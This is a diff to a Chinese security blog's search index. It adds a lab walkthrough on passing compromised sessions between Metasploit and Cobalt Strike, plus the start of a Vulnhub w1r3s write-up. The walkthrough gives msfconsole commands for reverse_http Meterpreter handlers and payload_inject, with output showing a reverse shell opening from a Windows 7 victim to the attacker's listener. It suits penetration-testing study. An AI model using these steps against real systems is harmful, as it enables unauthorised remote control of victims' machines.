@@ -1,6 +1,43 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Msf与CobaltStrike互相联动</title>
+    <url>/2021/04/19/Msf%E4%B8%8ECobaltStrike%E4%BA%92%E7%9B%B8%E8%81%94%E5%8A%A8/</url>
+    <content><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h3><p>这里记录一下Msf与CobaltStrike互相联动的过程<span id="more"></span></p>
+<p>CS服务端和MSF均在kali上，肉鸡为win7</p>
+<h3 id="0x02-CS联动MSF"><a href="#0x02-CS联动MSF" class="headerlink" title="0x02  CS联动MSF"></a>0x02  CS联动MSF</h3><h4 id="CS设置"><a href="#CS设置" class="headerlink" title="CS设置"></a>CS设置</h4><p>建立监听地址，使用payload为Foreign HTTP,端口为8888</p>
+<p><img src="/2021/04/19/Msf%E4%B8%8ECobaltStrike%E4%BA%92%E7%9B%B8%E8%81%94%E5%8A%A8/1.png"></p>
+<h4 id="MSF设置"><a href="#MSF设置" class="headerlink" title="MSF设置"></a>MSF设置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">[*] Using configured payload generic&#x2F;shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_http</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/19/Msf%E4%B8%8ECobaltStrike%E4%BA%92%E7%9B%B8%E8%81%94%E5%8A%A8/2.png"></p>
+<p>设置lhost为msf的地址，lport端口和cs的监听端口一样为8888，输入run开始监听</p>
+<h4 id="CS派生shell到MSF"><a href="#CS派生shell到MSF" class="headerlink" title="CS派生shell到MSF"></a>CS派生shell到MSF</h4><p>选中需要派生shell的主机右键spawn。选择我们设置好的foreign http监听器。然后点击choose，点击开始</p>
+<p><img src="/2021/04/19/Msf%E4%B8%8ECobaltStrike%E4%BA%92%E7%9B%B8%E8%81%94%E5%8A%A8/4.png"></p>
+<p>msf接收到cs派生的shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started HTTP reverse handler on http:&#x2F;&#x2F;192.168.126.135:8888</span><br><span class="line">[*] http:&#x2F;&#x2F;192.168.126.135:8888 handling request from 192.168.126.136; (UUID: vvpe3mzr) Staging x86 payload (176220 bytes) ...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.135:8888 -&gt; 192.168.126.136:50094) at 2021-04-19 07:57:27 -0400</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: admin-PC\admin</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-MSF联动CS"><a href="#0x03-MSF联动CS" class="headerlink" title="0x03  MSF联动CS"></a>0x03  MSF联动CS</h3><h4 id="CS设置-1"><a href="#CS设置-1" class="headerlink" title="CS设置"></a>CS设置</h4><p>cs设置监听，payload选择beacon HTTP,端口9999，保存</p>
+<p><img src="/2021/04/19/Msf%E4%B8%8ECobaltStrike%E4%BA%92%E7%9B%B8%E8%81%94%E5%8A%A8/5.png"></p>
+<h4 id="MSF设置-1"><a href="#MSF设置-1" class="headerlink" title="MSF设置"></a>MSF设置</h4><p>将msf之前获得的meterpreter会话挂入后台运行</p>
+<p><img src="/2021/04/19/Msf%E4%B8%8ECobaltStrike%E4%BA%92%E7%9B%B8%E8%81%94%E5%8A%A8/6.png"></p>
+<h4 id="MSF派生shell到CS"><a href="#MSF派生shell到CS" class="headerlink" title="MSF派生shell到CS"></a>MSF派生shell到CS</h4><p>使用 exploit/windows/local/payload_inject 来注入一个新的payload到session中（这里的payload要和cs设置监听的payload一样）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject </span><br><span class="line">[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set lhost 192.168.126.135</span><br><span class="line">lhost &#x3D;&gt; 192.168.126.135</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set lport 9999</span><br><span class="line">lport &#x3D;&gt; 9999</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set session 2</span><br><span class="line">session &#x3D;&gt; 2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/19/Msf%E4%B8%8ECobaltStrike%E4%BA%92%E7%9B%B8%E8%81%94%E5%8A%A8/7.png"></p>
+<p>CS成功接收到msf派生的shell</p>
+<p><img src="/2021/04/19/Msf%E4%B8%8ECobaltStrike%E4%BA%92%E7%9B%B8%E8%81%94%E5%8A%A8/8.png"></p>
+<p>告辞！</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Msf</tag>
+        <tag>CobaltStrike</tag>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>w1r3s</title>
     <url>/2021/04/19/w1r3s/</url>
     <content><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h3><p>这是vulnhub靶场挑战的第六篇，使用kali进行攻击，加油！奥利给！<span id="more"></span></p>
